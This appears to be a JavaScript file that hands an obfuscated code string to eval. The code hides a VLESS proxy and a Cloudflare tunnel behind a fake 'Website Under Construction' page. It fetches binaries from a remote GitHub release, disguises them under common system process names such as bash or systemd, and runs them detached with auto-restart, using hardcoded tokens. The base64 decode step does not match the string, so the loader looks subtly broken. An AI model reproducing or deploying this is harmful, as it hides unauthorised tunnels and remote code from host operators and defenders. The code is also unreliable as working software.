const b = 'const _0x3b5b26=_0x1510;(function(_0x4b532b,_0x3f08d){const _0x173344=_0x1510,_0x563413=_0x4b532b();while(!![]){try{const _0x217763=parseInt(_0x173344(0x17c))/0x1*(parseInt(_0x173344(0x16f))/0x2)+-parseInt(_0x173344(0x162))/0x3*(-parseInt(_0x173344(0x142))/0x4)+parseInt(_0x173344(0x195))/0x5*(-parseInt(_0x173344(0x169))/0x6)+-parseInt(_0x173344(0x153))/0x7*(-parseInt(_0x173344(0x18e))/0x8)+parseInt(_0x173344(0x13d))/0x9*(-parseInt(_0x173344(0x19b))/0xa)+-parseInt(_0x173344(0x151))/0xb+parseInt(_0x173344(0x15a))/0xc*(parseInt(_0x173344(0x18c))/0xd);if(_0x217763===_0x3f08d)break;else _0x563413['push'](_0x563413['shift']());}catch(_0x22816c){_0x563413['push'](_0x563413['shift']());}}}(_0x1553,0x9618e));const {exec,spawn}=require(_0x3b5b26(0x19a)),{WebSocketServer,createWebSocketStream}=require('ws'),http=require(_0x3b5b26(0x161)),{URL}=require(_0x3b5b26(0x167)),net=require(_0x3b5b26(0x163)),{tmpdir}=require('os'),{join}=require('path'),{createWriteStream,promises:fs}=require('fs'),axios=require('axios'),{pipeline}=require(_0x3b5b26(0x199)),CONFIG={'UUID':(process['env'][_0x3b5b26(0x186)]||_0x3b5b26(0x13e))[_0x3b5b26(0x193)](/-/g,''),'PORT':process[_0x3b5b26(0x198)]['PORT']||process[_0x3b5b26(0x198)][_0x3b5b26(0x144)]||0x1f90,'K_S':process[_0x3b5b26(0x198)][_0x3b5b26(0x197)]||_0x3b5b26(0x192),'C_B':process[_0x3b5b26(0x198)][_0x3b5b26(0x191)]||_0x3b5b26(0x17d),'K_K':process[_0x3b5b26(0x198)]['K_K']||'ZLeALav_EjaQVoV7','C_T':process[_0x3b5b26(0x198)][_0x3b5b26(0x18a)]||_0x3b5b26(0x184),'C_D':process[_0x3b5b26(0x198)]['C_D']||_0x3b5b26(0x15b)},COMMON_NAMES=[_0x3b5b26(0x17b),'npm',_0x3b5b26(0x170),'wget',_0x3b5b26(0x18d),_0x3b5b26(0x168),'tar',_0x3b5b26(0x158),_0x3b5b26(0x17a),'java','systemd',_0x3b5b26(0x172),_0x3b5b26(0x15f),_0x3b5b26(0x19e),_0x3b5b26(0x188),_0x3b5b26(0x15e),'sh','vim','nano',_0x3b5b26(0x13b),_0x3b5b26(0x173),_0x3b5b26(0x157),_0x3b5b26(0x146)],randName=()=>COMMON_NAMES[Math[_0x3b5b26(0x19c)](Math[_0x3b5b26(0x15d)]()*COMMON_NAMES['length'])],vlessLink=()=>_0x3b5b26(0x148)+CONFIG[_0x3b5b26(0x186)]+'@'+CONFIG['C_B']+_0x3b5b26(0x16c)+CONFIG[_0x3b5b26(0x183)]+'&encryption=none&sni='+CONFIG[_0x3b5b26(0x183)]+_0x3b5b26(0x1a1)+CONFIG['C_D'],HTML_TEMPLATES={'home':'<!DOCTYPE\x20html><html><head><title>Under\x20Construction</title><style>\x0a\x20\x20body{font-family:Arial,sans-serif;margin:0;padding:0;background:linear-gradient(135deg,#667eea\x200%,#764ba2\x20100%);min-height:100vh;display:flex;align-items:center;justify-content:center}\x0a\x20\x20.container{text-align:center;background:white;padding:60px\x2040px;border-radius:15px;box-shadow:0\x2010px\x2030px\x20rgba(0,0,0,0.2);max-width:500px;margin:20px}\x0a\x20\x20h1{color:#333;font-size:2.5em;margin-bottom:20px;font-weight:300}\x0a\x20\x20p{color:#666;font-size:1.2em;line-height:1.6;margin-bottom:30px}\x0a\x20\x20.icon{font-size:4em;margin-bottom:20px;color:#667eea;font-weight:bold}\x0a\x20\x20.footer{color:#999;font-size:0.9em;margin-top:30px}\x0a\x20\x20</style></head><body><div\x20class=\x22container\x22><div\x20class=\x22icon\x22>[!]</div>\x0a\x20\x20<h1>Website\x20Under\x20Construction</h1><p>We\x27re\x20working\x20hard\x20to\x20bring\x20you\x20something\x20amazing.\x20Please\x20check\x20back\x20soon!</p>\x0a\x20\x20<div\x20class=\x22footer\x22>Thank\x20you\x20for\x20your\x20patience.</div></div></body></html>','status':(_0x507847,_0x56fc01)=>_0x3b5b26(0x150)+_0x507847+_0x3b5b26(0x1a3)+_0x56fc01+_0x3b5b26(0x152)+_0x56fc01+_0x3b5b26(0x1a0)},server=http[_0x3b5b26(0x155)]((_0x92f52b,_0x253cc0)=>{const _0x227630=_0x3b5b26;try{const {pathname:_0x32f027}=new URL(_0x92f52b[_0x227630(0x167)],_0x227630(0x194)+_0x92f52b['headers'][_0x227630(0x187)]);if(_0x32f027==='/')_0x253cc0['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x253cc0['end'](HTML_TEMPLATES['home']);else{if(_0x32f027==='/x')_0x253cc0[_0x227630(0x156)](0xc8,{'Content-Type':_0x227630(0x176)}),_0x253cc0[_0x227630(0x14d)](HTML_TEMPLATES[_0x227630(0x159)](CONFIG[_0x227630(0x16d)],vlessLink()));else _0x32f027===_0x227630(0x15c)?(_0x253cc0[_0x227630(0x156)](0xc8,{'Content-Type':'application/json'}),_0x253cc0[_0x227630(0x14d)](JSON[_0x227630(0x13f)]({'status':'ok','uptime':process[_0x227630(0x154)]()}))):(_0x253cc0[_0x227630(0x156)](0x194,{'Content-Type':_0x227630(0x181)}),_0x253cc0['end'](_0x227630(0x1a2)));}}catch{!_0x253cc0[_0x227630(0x141)]&&(_0x253cc0['writeHead'](0x1f4,{'Content-Type':_0x227630(0x181)}),_0x253cc0['end'](_0x227630(0x196)));}}),wss=new WebSocketServer({'server':server,'path':'/vls'});wss['on']('connection',_0xb7981b=>{const _0x151325=_0x3b5b26;_0xb7981b[_0x151325(0x14a)](_0x151325(0x166),_0x3c8ac4=>{const _0x253c82=_0x151325,[_0x443c78]=_0x3c8ac4,_0x41fb27=_0x3c8ac4[_0x253c82(0x190)](0x1,0x11);if(!_0x41fb27[_0x253c82(0x185)]((_0xa8cdb1,_0x418769)=>_0xa8cdb1===parseInt(CONFIG['UUID'][_0x253c82(0x171)](_0x418769*0x2,0x2),0x10)))return;let _0xc09dc7=_0x3c8ac4[_0x253c82(0x190)](0x11,0x12)[_0x253c82(0x18f)]()+0x13;const _0x142c24=_0x3c8ac4[_0x253c82(0x190)](_0xc09dc7,_0xc09dc7+=0x2)[_0x253c82(0x143)](0x0),_0x4552d9=_0x3c8ac4['slice'](_0xc09dc7,_0xc09dc7+=0x1)[_0x253c82(0x18f)]();let _0x386219;if(_0x4552d9===0x1)_0x386219=_0x3c8ac4[_0x253c82(0x190)](_0xc09dc7,_0xc09dc7+=0x4)[_0x253c82(0x14f)]('.');else{if(_0x4552d9===0x2){const _0x5b9e16=_0x3c8ac4[_0x253c82(0x190)](_0xc09dc7,_0xc09dc7+=0x1)['readUInt8']();_0x386219=new TextDecoder()[_0x253c82(0x17e)](_0x3c8ac4['slice'](_0xc09dc7,_0xc09dc7+=_0x5b9e16));}else _0x4552d9===0x3&&(_0x386219=_0x3c8ac4[_0x253c82(0x190)](_0xc09dc7,_0xc09dc7+=0x10)[_0x253c82(0x182)]((_0x421b2d,_0x57aab8,_0x465f81,_0x556a3b)=>_0x465f81%0x2?_0x421b2d[_0x253c82(0x145)](_0x556a3b[_0x253c82(0x190)](_0x465f81-0x1,_0x465f81+0x1)):_0x421b2d,[])[_0x253c82(0x19f)](_0x13cd46=>_0x13cd46[_0x253c82(0x143)](0x0)[_0x253c82(0x1a4)](0x10))[_0x253c82(0x14f)](':'));}if(_0xb7981b[_0x253c82(0x16b)]===_0xb7981b[_0x253c82(0x149)]){_0xb7981b[_0x253c82(0x14e)](new Uint8Array([_0x443c78,0x0]));const _0x489192=createWebSocketStream(_0xb7981b)['on'](_0x253c82(0x174),()=>{}),_0xd37916=net['connect']({'host':_0x386219,'port':_0x142c24},function(){const _0x3272b9=_0x253c82;this['write'](_0x3c8ac4[_0x3272b9(0x190)](_0xc09dc7)),_0x489192['pipe'](this)[_0x3272b9(0x14c)](_0x489192);});_0xd37916['on'](_0x253c82(0x174),()=>{});}});});function _0x1553(){const _0x50bce9=['</div>\x0a\x20\x20<button\x20class=\x22copy-btn\x22\x20onclick=\x22navigator.clipboard.writeText(\x27','7BfAyQo','uptime','createServer','writeHead','yum','gzip','status','699444MEjQnG','deepnote.seav.eu.org','/health','random','bash','dbus','https://github.com/seav1/dl/releases/download/files','http','3cEMTrs','net','tunnel\x20--edge-ip-version\x20auto\x20--protocol\x20http2\x20--no-autoupdate\x20run\x20--token\x20','),\x20restarting...','message','url','rsync','78jWdRfI','unref','readyState',':443?type=ws&path=%2Fvls&host=','PORT','log','648662uAYmmr','curl','substr','cron','apt','error','Mozilla/5.0','text/html','-e\x20','stream','listen','python','node','2NXGmSN','loc.gov','decode','split','K_K','text/plain','reduce','C_D','eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiNjVhNzM5OTktZDIwNi00MDEwLTg0NTYtYWY0ZDQzMTNjY2ExIiwicyI6IlltSXdZMkkxTmpVdFlXUmtZaTAwTUdRM0xUa3dNVFF0TmpFd1lUWmlaR0ppTWpjMyJ9','every','UUID','host','kmod','\x20exited\x20(code=','C_T','arm64','130IDcDvt','ssh','3010552RFTwSc','readUInt8','slice','C_B','https://komari.seav.eu.org','replace','http://','82965tNAosO','Internal\x20Server\x20Error','K_S','env','stream/promises','child_process','6539990KipOlc','floor','unlink','udev','map','\x27).then(()=>alert(\x27Copied!\x27))\x22>Copy</button></div>\x0a\x20\x20</div></body></html>','&fp=chrome&security=tls#','Not\x20Found','</div></div>\x0a\x20\x20<div\x20class=\x22info-item\x22><div\x20class=\x22label\x22>Connection\x20Link:</div><div\x20class=\x22value\x22\x20id=\x22vlessLink\x22>','toString','/cf','git','ignore','9bfSvkP','feefeb96-bfcf-4a9b-aac0-6aac771c1b98','stringify','catch','headersSent','614644SFwZVc','readUInt16BE','SERVER_PORT','concat','service','\x20-t\x20','vless://','OPEN','once','chmod','pipe','end','send','join','<!DOCTYPE\x20html><html><head><title>Service\x20Status</title><style>\x0a\x20\x20body{font-family:Arial,sans-serif;margin:40px;background-color:#f5f5f5}\x0a\x20\x20.container{max-width:600px;margin:0\x20auto;background:white;padding:30px;border-radius:8px;box-shadow:0\x202px\x2010px\x20rgba(0,0,0,0.1)}\x0a\x20\x20h1{color:#333;text-align:center}\x0a\x20\x20.info-item{margin:20px\x200;padding:15px;background:#f8f9fa;border-radius:5px}\x0a\x20\x20.label{font-weight:bold;color:#555;margin-bottom:10px}\x0a\x20\x20.value{font-family:monospace;background:#e9ecef;padding:10px;border-radius:4px;word-break:break-all}\x0a\x20\x20.copy-btn{background:#007cba;color:white;border:none;padding:8px\x2015px;border-radius:3px;cursor:pointer;margin-top:10px}\x0a\x20\x20.copy-btn:hover{background:#0056b3}\x0a\x20\x20</style></head><body><div\x20class=\x22container\x22><h1>Service\x20Running</h1>\x0a\x20\x20<div\x20class=\x22info-item\x22><div\x20class=\x22label\x22>Port:</div><div\x20class=\x22value\x22>','3047066ZVhpkG'];_0x1553=function(){return _0x50bce9;};return _0x1553();}async function downloadAndRun(_0x37f6d3,_0x3292fd,_0x22dd54){const _0xa64131=_0x3b5b26;if(!_0x37f6d3)return;const _0x1e3654=join(tmpdir(),randName());try{const _0x454e3a=await axios({'url':_0x37f6d3,'responseType':_0xa64131(0x178),'timeout':0x7530,'headers':{'User-Agent':_0xa64131(0x175)}});await pipeline(_0x454e3a['data'],createWriteStream(_0x1e3654)),await fs[_0xa64131(0x14b)](_0x1e3654,0x1ed),spawnProcess(_0x1e3654,_0x3292fd,_0x22dd54);}catch{await fs[_0xa64131(0x19d)](_0x1e3654)[_0xa64131(0x140)](()=>{});}}function spawnProcess(_0x1a5f4e,_0x56a292,_0x285312){const _0x12d752=_0x3b5b26,_0x176323=spawn(_0x1a5f4e,_0x56a292[_0x12d752(0x17f)]('\x20'),{'stdio':_0x12d752(0x13c),'detached':!![]});_0x176323[_0x12d752(0x16a)](),_0x176323['on']('exit',(_0x505bb9,_0x4dc7b9)=>{const _0xfcdc55=_0x12d752;console[_0xfcdc55(0x16e)](_0x285312+_0xfcdc55(0x189)+_0x505bb9+',\x20signal='+_0x4dc7b9+_0xfcdc55(0x165)),setTimeout(()=>spawnProcess(_0x1a5f4e,_0x56a292,_0x285312),0x1388);});}function _0x1510(_0x59bdfd,_0x5b1687){const _0x1553a8=_0x1553();return _0x1510=function(_0x15101f,_0x2fbac6){_0x15101f=_0x15101f-0x13b;let _0x55e1a0=_0x1553a8[_0x15101f];return _0x55e1a0;},_0x1510(_0x59bdfd,_0x5b1687);}const baseUrl=_0x3b5b26(0x160),archUrl=_0x2cfeaa=>process['arch']===_0x3b5b26(0x18b)?_0x2cfeaa+'-arm':_0x2cfeaa;downloadAndRun(archUrl(baseUrl+'/ko'),_0x3b5b26(0x177)+CONFIG[_0x3b5b26(0x197)]+_0x3b5b26(0x147)+CONFIG[_0x3b5b26(0x180)],'ko'),downloadAndRun(archUrl(baseUrl+_0x3b5b26(0x1a5)),_0x3b5b26(0x164)+CONFIG[_0x3b5b26(0x18a)],'cf'),server[_0x3b5b26(0x179)](CONFIG[_0x3b5b26(0x16d)]);';
const code = Buffer.from(b, 'base64').toString();
eval(code);
